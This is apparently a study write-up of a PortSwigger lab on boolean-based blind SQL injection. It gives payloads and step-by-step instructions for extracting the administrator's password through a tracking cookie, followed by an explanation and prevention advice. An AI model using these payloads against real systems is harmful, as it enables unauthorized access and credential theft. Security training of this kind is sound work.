SQL Injection: Blind SQLi with Conditional Responses

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

---

Vulnerability

The application is vulnerable to blind SQL injection via a tracking cookie.
The query result is not displayed, but the application behavior changes based on whether the query returns data.

---

Payloads

Check condition:

' AND '1'='1

' AND '1'='2

Extract password (example):

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a

---

Exploitation Steps

1. Intercept the request using Burp Suite.

2. Locate the tracking cookie (e.g., "TrackingId").

3. Inject a condition:

TrackingId=xyz' AND '1'='1

→ Response contains “Welcome back”

4. Test false condition:

TrackingId=xyz' AND '1'='2

→ No “Welcome back”

5. Extract password character by character:

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a

6. Repeat for each position until full password is obtained.

7. Log in as administrator.

---

Why the Attack Works

- The application does not return query results
- It reveals information through behavioral differences
- True/false conditions allow data extraction one character at a time

This is known as boolean-based blind SQL injection.

---

Prevention

- Use parameterized queries
- Avoid using user input directly in SQL queries
- Implement proper input validation
